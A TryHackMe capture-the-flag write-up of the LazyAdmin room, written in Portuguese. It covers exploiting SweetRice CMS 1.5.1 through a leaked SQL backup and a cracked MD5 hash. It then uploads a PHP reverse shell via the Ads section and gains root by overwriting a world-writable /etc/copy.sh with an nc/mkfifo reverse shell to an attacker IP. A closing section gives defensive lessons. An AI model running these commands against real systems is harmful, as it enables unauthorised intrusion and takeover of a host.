# LazyAdmin — TryHackMe Write-up

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue)
![OS](https://img.shields.io/badge/OS-Linux-lightgrey)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## Machine Information

| Attribute          | Details              |
|--------------------|----------------------|
| **Name**           | LazyAdmin            |
| **Platform**       | TryHackMe            |
| **Difficulty**     | Easy                 |
| **OS**             | Linux (Ubuntu 16.04) |
| **Date Completed** | April 2026           |

---

## Attack Chain

```
RECON      →  nmap + gobuster (/content/)        →  SweetRice CMS 1.5.1
SQL LEAK   →  /content/inc/mysql_backup/         →  hash MD5 do admin
CRACK      →  CrackStation / hashcat             →  manager:Password123
LOGIN      →  /content/as/ (painel admin)        →  acesso ao CMS
RCE        →  Ads section → PHP reverse shell    →  shell como www-data
USER FLAG  →  /home/itguy/user.txt               →  e6e422...
PRIVESC    →  sudo -l → backup.pl → /etc/copy.sh (777) → root shell
ROOT FLAG  →  /root/root.txt                     →  thmlazyadmin...
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

| Port   | Service | Version        | Note                  |
|--------|---------|----------------|-----------------------|
| 22/tcp | SSH     | OpenSSH 7.2p2  | —                     |
| 80/tcp | HTTP    | Apache 2.4.18  | SweetRice CMS 1.5.1   |

Dois serviços. SSH sem credenciais imediatas. O HTTP serve uma aplicação CMS — superfície de ataque maior que uma página estática.

### Directory Enumeration

```bash
gobuster dir \
  -u http://<IP> \
  -w /usr/share/wordlists/dirb/common.txt \
  -o gobuster.txt
```

Diretório relevante encontrado: `/content/`

Segunda rodada de gobuster dentro do CMS:

```bash
gobuster dir \
  -u http://<IP>/content/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -o gobuster_content.txt
```

| Caminho                        | Observação                              |
|--------------------------------|-----------------------------------------|
| `/content/as/`                 | Painel de login do admin                |
| `/content/inc/`                | Diretório de includes — arquivos internos |
| `/content/inc/mysql_backup/`   | **Backup SQL exposto publicamente**     |

### SQL Backup — Credenciais Expostas

```bash
# Download do arquivo de backup
wget http://<IP>/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql

# Extrair credenciais
grep -i "admin\|manager\|password\|user" mysql_bakup_20191129023059-1.5.1.sql
```

Dados extraídos do backup:

| Campo    | Valor                              |
|----------|------------------------------------|
| Username | `manager`                          |
| Hash     | `24321229d38072110255a643806f30a9` |
| Tipo     | MD5                                |

### Hash Cracking

```bash
# Via hashcat
hashcat -m 0 24321229d38072110255a643806f30a9 /usr/share/wordlists/rockyou.txt

# Ou via CrackStation (online)
# https://crackstation.net
```

**Resultado:** `Password123`

> **Por que MD5 é inseguro para senhas:** MD5 é um algoritmo de hash sem salt e extremamente rápido de computar. Uma GPU moderna testa bilhões de hashes MD5 por segundo. Senhas comuns como `Password123` estão em rainbow tables públicas — crackstation.net resolve em menos de um segundo. Aplicações modernas devem usar bcrypt, scrypt ou Argon2.

---

## Initial Access

### Login no Painel Administrativo

Acesso via `http://<IP>/content/as/` com as credenciais obtidas:

```
Username: manager
Password: Password123
```

### Reverse Shell via Ads Section

O SweetRice 1.5.1 permite inserir código HTML/PHP na funcionalidade de Anúncios (Ads). Sem sanitização, o PHP é salvo e executado pelo servidor.

**Payload — PHP Reverse Shell:**

```php
<?php
// Conteúdo do /usr/share/webshells/php/php-reverse-shell.php
// Editar: $ip = '<KALI_IP>'; $port = 1234;
?>
```

**Passos:**
1. Acessar o painel → seção **Ads**
2. Criar novo anúncio com o conteúdo da reverse shell PHP
3. Salvar — o arquivo é gravado em `/content/inc/ads/`
4. Abrir listener no Kali:

```bash
nc -lvnp 1234
```

5. Acessar `http://<IP>/content/inc/ads/shellphp.php`

Shell recebida como `www-data`. Estabilização:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Post-Exploitation

```bash
cat /home/itguy/user.txt
# e6e422...
```

---

## Privilege Escalation

### Enumeração de Sudo

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

`www-data` pode executar um script Perl como root sem senha. O próximo passo é inspecionar o script.

### Análise do Script

```bash
cat /home/itguy/backup.pl
```

```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

O script Perl chama `/etc/copy.sh`. Verificar permissões:

```bash
ls -la /etc/copy.sh
# -rwxrwxrwx 1 root root ... /etc/copy.sh
```

Permissões `777` — qualquer usuário pode escrever no arquivo. O fluxo de execução privilegiado pode ser sequestrado.

### Exploração — Script Hijacking

```bash
# Sobrescrever o copy.sh com reverse shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f" > /etc/copy.sh
```

Abrir novo listener no Kali:

```bash
nc -lvnp 4444
```

Executar o comando sudo:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

Fluxo de execução:
```
sudo perl backup.pl  (root)
    → chama /etc/copy.sh  (root)
        → copy.sh contém nossa reverse shell
            → conecta no Kali como root
```

```bash
whoami
# root

cat /root/root.txt
# thmlazyadmin...
```

---

## Flags

| File       | Path               | Flag              |
|------------|--------------------|-------------------|
| `user.txt` | `/home/itguy/`     | `e6e422...`       |
| `root.txt` | `/root/`           | `thmlazyadmin...` |

---

## Lições Aprendidas

**Backups em diretórios web públicos entregam todo o sistema.** O arquivo `.sql` estava acessível sem autenticação em `/content/inc/mysql_backup/`. Backups de banco de dados contêm estrutura, dados e credenciais — devem estar fora do document root ou protegidos por `.htaccess`. Diretórios `inc`, `backup`, `db` dentro de aplicações web são alvos prioritários de enumeração.

**MD5 sem salt não é armazenamento seguro de senha.** O hash `24321229d38072110255a643806f30a9` foi resolvido instantaneamente por rainbow tables públicas. Aplicações modernas devem usar algoritmos de hash lentos por design (bcrypt, Argon2) com salt único por usuário.

**Permissões 777 em arquivos chamados por processos privilegiados são privesc garantida.** O `/etc/copy.sh` era executado como root via cadeia `sudo → perl → sh`. Permissão de escrita para todos transformou um script de sistema em vetor de escalada. Arquivos chamados por processos privilegiados devem ter permissões restritas — idealmente `750` com dono root.

```bash
# Referência — identificar arquivos writable em caminhos privilegiados
find /etc -writable -type f 2>/dev/null

# Verificar sudo imediatamente após obter shell
sudo -l

# Rastrear o que um script privilegiado chama
cat /home/itguy/backup.pl
```

---

## Tools Used

| Tool         | Purpose                                       |
|--------------|-----------------------------------------------|
| `nmap`       | Port scanning e detecção de serviços          |
| `gobuster`   | Enumeração de diretórios — descoberta do CMS  |
| `wget`       | Download do arquivo SQL de backup             |
| `hashcat`    | Quebra de hash MD5                            |
| `netcat`     | Listener para reverse shell                   |

---

## References

- [SweetRice 1.5.1 — Exploit-DB](https://www.exploit-db.com/exploits/40716) — arbitrary file upload via Ads
- [GTFOBins — Perl](https://gtfobins.github.io/gtfobins/perl/) — execução de comandos via Perl
- [CrackStation](https://crackstation.net) — rainbow tables para MD5

---

*UmbraNull · [github.com/igorleite97](https://github.com/igorleite97) · offensive-writeups*